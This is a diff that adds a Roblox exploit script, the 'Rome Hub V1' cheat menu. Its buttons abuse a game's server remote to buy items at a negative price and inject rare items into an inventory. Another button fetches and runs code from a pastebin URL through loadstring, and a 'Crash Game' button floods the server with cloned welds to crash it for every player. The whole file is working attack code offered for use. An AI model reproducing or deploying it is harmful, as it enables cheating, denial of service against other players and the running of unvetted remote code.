@@ -1,0 +1,383 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local RomeHubV1 = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
+local Button1 = Instance.new("TextButton")
+local Button2 = Instance.new("TextButton")
+local Button3 = Instance.new("TextButton")
+local TextLabel_2 = Instance.new("TextLabel")
+local TextLabel_3 = Instance.new("TextLabel")
+
+--Properties:
+
+RomeHubV1.Name = "RomeHub V1"
+RomeHubV1.Parent = game.CoreGui
+
+Frame.Parent = RomeHubV1
+Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame.BorderSizePixel = 0
+Frame.Position = UDim2.new(0.310302287, 0, 0.332515329, 0)
+Frame.Size = UDim2.new(0, 361, 0, 313)
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(76, 76, 76)
+TextLabel.BorderSizePixel = 0
+TextLabel.Position = UDim2.new(-0.00114239391, 0, -0.000262665679, 0)
+TextLabel.Size = UDim2.new(0, 362, 0, 36)
+TextLabel.Font = Enum.Font.GothamBold
+TextLabel.Text = "Rome Hub V.1"
+TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextSize = 14.000
+
+Button1.Name = "Button1"
+Button1.Parent = Frame
+Button1.BackgroundColor3 = Color3.fromRGB(76, 76, 76)
+Button1.BorderSizePixel = 0
+Button1.Position = UDim2.new(0.735685229, 0, 0.232152715, 0)
+Button1.Size = UDim2.new(0, 83, 0, 50)
+Button1.Font = Enum.Font.GothamBold
+Button1.Text = "[WIP]"
+Button1.TextColor3 = Color3.fromRGB(0, 0, 0)
+Button1.TextSize = 14.000
+
+Button2.Name = "Button2"
+Button2.Parent = Frame
+Button2.BackgroundColor3 = Color3.fromRGB(76, 76, 76)
+Button2.BorderSizePixel = 0
+Button2.Position = UDim2.new(0.384971499, 0, 0.235347599, 0)
+Button2.Size = UDim2.new(0, 83, 0, 50)
+Button2.Font = Enum.Font.GothamBold
+Button2.Text = "Item Spawn"
+Button2.TextColor3 = Color3.fromRGB(0, 0, 0)
+Button2.TextSize = 14.000
+
+Button3.Name = "Button3"
+Button3.Parent = Frame
+Button3.BackgroundColor3 = Color3.fromRGB(76, 76, 76)
+Button3.BorderSizePixel = 0
+Button3.Position = UDim2.new(0.0367253944, 0, 0.235347599, 0)
+Button3.Size = UDim2.new(0, 83, 0, 50)
+Button3.Font = Enum.Font.GothamBold
+Button3.Text = "Crash Game"
+Button3.TextColor3 = Color3.fromRGB(0, 0, 0)
+Button3.TextSize = 14.000
+
+TextLabel_2.Parent = Frame
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(76, 76, 76)
+TextLabel_2.BorderSizePixel = 0
+TextLabel_2.Position = UDim2.new(-0.00277008303, 0, 0.910543144, 0)
+TextLabel_2.Size = UDim2.new(0, 362, 0, 28)
+TextLabel_2.Font = Enum.Font.GothamBold
+TextLabel_2.Text = "Made by Floppa#6627"
+TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_2.TextSize = 14.000
+
+TextLabel_3.Parent = Frame
+TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_3.BackgroundTransparency = 1.000
+TextLabel_3.Position = UDim2.new(0.417305082, 0, 0.353695661, 0)
+TextLabel_3.Size = UDim2.new(0, 58, 0, 50)
+TextLabel_3.Font = Enum.Font.GothamBold
+TextLabel_3.Text = "(Reset after clicking)"
+TextLabel_3.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_3.TextSize = 10.000
+
+-- Scripts:
+
+local function OWRJG_fake_script() -- Frame.Script 
+	local script = Instance.new('Script', Frame)
+
+	while wait() do
+		local r = (math.sin(workspace.DistributedGameTime/2)/2)+0.5
+		local g = (math.sin(workspace.DistributedGameTime)/2)+0.5
+		local b = (math.sin(workspace.DistributedGameTime*1.5)/2)+0.5
+		local color = Color3.new(r, g, b)
+		script.Parent.BackgroundColor3 = color
+	end
+end
+coroutine.wrap(OWRJG_fake_script)()
+local function ROYXG_fake_script() -- TextLabel.Script 
+	local script = Instance.new('Script', TextLabel)
+
+	while wait() do
+		local r = (math.sin(workspace.DistributedGameTime/2)/2)+0.5
+		local g = (math.sin(workspace.DistributedGameTime)/2)+0.5
+		local b = (math.sin(workspace.DistributedGameTime*1.5)/2)+0.5
+		local color = Color3.new(r, g, b)
+		script.Parent.TextColor3 = color
+	end
+end
+coroutine.wrap(ROYXG_fake_script)()
+local function GBEGUB_fake_script() -- Button1.Script 
+	local script = Instance.new('Script', Button1)
+
+	while wait() do
+		local r = (math.sin(workspace.DistributedGameTime/2)/2)+0.5
+		local g = (math.sin(workspace.DistributedGameTime)/2)+0.5
+		local b = (math.sin(workspace.DistributedGameTime*1.5)/2)+0.5
+		local color = Color3.new(r, g, b)
+		script.Parent.TextColor3 = color
+	end
+end
+coroutine.wrap(GBEGUB_fake_script)()
+local function GLCLYDA_fake_script() -- Button1.Script 
+	local script = Instance.new('Script', Button1)
+
+	Button1.MouseButton1Click:Connect(function()
+		local args = {
+			[1] = "buyitem",
+			[2] = -10000,
+		}
+	
+		game:GetService("Players")["EVOLVE_ROBLOX"].GwyneddFunctionDau:InvokeServer(unpack(args))
+	end)
+end
+coroutine.wrap(GLCLYDA_fake_script)()
+local function RJEJAKS_fake_script() -- Button2.Script 
+	local script = Instance.new('Script', Button2)
+
+	while wait() do
+		local r = (math.sin(workspace.DistributedGameTime/2)/2)+0.5
+		local g = (math.sin(workspace.DistributedGameTime)/2)+0.5
+		local b = (math.sin(workspace.DistributedGameTime*1.5)/2)+0.5
+		local color = Color3.new(r, g, b)
+		script.Parent.TextColor3 = color
+	end
+end
+coroutine.wrap(RJEJAKS_fake_script)()
+local function MEYY_fake_script() -- Button2.Script 
+	local script = Instance.new('Script', Button2)
+
+	Button2.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet(('https://pastebin.com/raw/eztqc4cs'),true))()
+	end)
+end
+coroutine.wrap(MEYY_fake_script)()
+local function MOYSYVT_fake_script() -- Button2.Script 
+	local script = Instance.new('Script', Button2)
+
+	Button2.MouseButton1Click:Connect(function()
+		local args = {
+			[1] = "abc",
+			[2] = {
+				["Inventory"] = {
+					[1] = {
+						["Name"] = "God of War Helm",
+						["Stack"] = 0,
+					},
+					[2] = {
+						["Name"] = "God of War Musc",
+						["Stack"] = 0,
+					},
+					[3] = {
+						["Name"] = "God of War Shield",
+						["Stack"] = 0,
+					},
+					[4] = {
+						["Name"] = "Royalty Cape",
+						["Stack"] = 0,
+					},
+					[5] = {
+						["Name"] = "Praetorian Gladius",
+						["Stack"] = 0,
+					},
+					[6] = {
+						["Name"] = "Praetorian Hasta",
+						["Stack"] = 0,
+					},
+					[7] = {
+						["Name"] = "Lictor  Gladius",
+						["Stack"] = 0,
+					},
+					[8] = {
+						["Name"] = "XX Gladius",
+						["Stack"] = 0,
+					},
+					[9] = {
+						["Name"] = "Pickaxe",
+						["Stack"] = 0,
+					},
+					[10] = {
+						["Name"] = "Axe",
+						["Stack"] = 0,
+					},
+					[11] = {
+						["Name"] = "Pickaxe",
+						["Stack"] = 0,
+					},
+					[12] = {
+						["Name"] = "Pickaxe",
+						["Stack"] = 0,
+					},
+					[13] = {
+						["Name"] = "Pickaxe",
+						["Stack"] = 0,
+					},
+					[14] = {
+						["Name"] = "Praetorian Gladius",
+						["Stack"] = 0,
+					},
+					[15] = {
+						["Name"] = "Praetorian Hasta",
+						["Stack"] = 0,
+					},
+					[16] = {
+						["Name"] = "Praetorian Musculata",
+						["Stack"] = 0,
+					},
+					[17] = {
+						["Name"] = "",
+						["Stack"] = 0,
+					},
+					[18] = {
+						["Name"] = "Axe",
+						["Stack"] = 0,
+					},
+				},
+				["Equipped"] = {
+					[1] = {
+						["Name"] = "Ruby Gladius",
+						["Stack"] = 0,
+					},
+					[2] = {
+					},
+				},
+				["Body"] = {
+					[1] = {
+					},
+					[2] = {
+					},
+					[3] = {
+					},
+					[4] = {
+						["Name"] = "Midnight Cape",
+						["Stack"] = 0,
+					},
+					[5] = {
+					},
+				},
+			},
+		}
+	
+		game:GetService("Players")["EVOLVE_ROBLOX"].GwyneddFunctionDau:InvokeServer(unpack(args))
+	end)
+end
+coroutine.wrap(MOYSYVT_fake_script)()
+local function QIDTSF_fake_script() -- Button3.Script 
+	local script = Instance.new('Script', Button3)
+
+	while wait() do
+		local r = (math.sin(workspace.DistributedGameTime/2)/2)+0.5
+		local g = (math.sin(workspace.DistributedGameTime)/2)+0.5
+		local b = (math.sin(workspace.DistributedGameTime*1.5)/2)+0.5
+		local color = Color3.new(r, g, b)
+		script.Parent.TextColor3 = color
+	end
+end
+coroutine.wrap(QIDTSF_fake_script)()
+local function GXUMEI_fake_script() -- Button3.Script 
+	local script = Instance.new('Script', Button3)
+
+	Button3.MouseButton1Click:Connect(function()
+		power = 200 -- adjust this for additional lag. PS: If you leave after 5 minutes with the script running, it'll crash the server anyway.
+		local run = game:GetService"RunService"
+		local localplayer = game:GetService"Players".LocalPlayer
+		local r15
+	
+		if localplayer.Backpack:FindFirstChildOfClass"Tool" then
+			localplayer.Backpack:FindFirstChildOfClass"Tool".Parent = localplayer.Character
+		end
+	
+		if localplayer.Character:FindFirstChild"UpperTorso" then
+			r15 = true
+		elseif localplayer.Character:FindFirstChild"Torso" then
+			r15 = false
+		end
+	
+		if r15 then
+			for i = 1,power do
+				run.Stepped:Connect(function()
+					local clone = localplayer.Character["RightHand"].RightGrip:Clone()
+					clone.Parent = localplayer.Character["RightHand"]
+					wait()
+					clone.Parent = workspace
+				end)
+			end
+		else
+			for i = 1,power do
+				run.Stepped:Connect(function()
+					local clone = localplayer.Character["Right Arm"].RightGrip:Clone()
+					clone.Parent = localplayer.Character["Right Arm"]
+					wait()
+					clone.Parent = workspace
+				end)
+			end
+		end
+	
+	
+		--[[ ps: it takes a moment for server to crash be patient, proto sucks and dont set the power for too high : ) edit: you need tools for it to work, may not work on some games but should work on most of them  Wink]]
+	end)
+end
+coroutine.wrap(GXUMEI_fake_script)()
+local function DIGTNLO_fake_script() -- TextLabel_2.Script 
+	local script = Instance.new('Script', TextLabel_2)
+
+	while wait() do
+		local r = (math.sin(workspace.DistributedGameTime/2)/2)+0.5
+		local g = (math.sin(workspace.DistributedGameTime)/2)+0.5
+		local b = (math.sin(workspace.DistributedGameTime*1.5)/2)+0.5
+		local color = Color3.new(r, g, b)
+		script.Parent.TextColor3 = color
+	end
+end
+coroutine.wrap(DIGTNLO_fake_script)()
+local function XTAJHBD_fake_script() -- Frame.DraggableGUI 
+	local script = Instance.new('LocalScript', Frame)
+
+	local UserInputService = game:GetService("UserInputService")
+	
+	local gui = script.Parent
+	
+	local dragging
+	local dragInput
+	local dragStart
+	local startPos
+	
+	local function update(input)
+		local delta = input.Position - dragStart
+		gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+	end
+	
+	gui.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			dragging = true
+			dragStart = input.Position
+			startPos = gui.Position
+			
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					dragging = false
+				end
+			end)
+		end
+	end)
+	
+	gui.InputChanged:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+			dragInput = input
+		end
+	end)
+	
+	UserInputService.InputChanged:Connect(function(input)
+		if input == dragInput and dragging then
+			if gui.Visible then
+				update(input)
+			end
+		end
+	end)
+end
+coroutine.wrap(XTAJHBD_fake_script)()
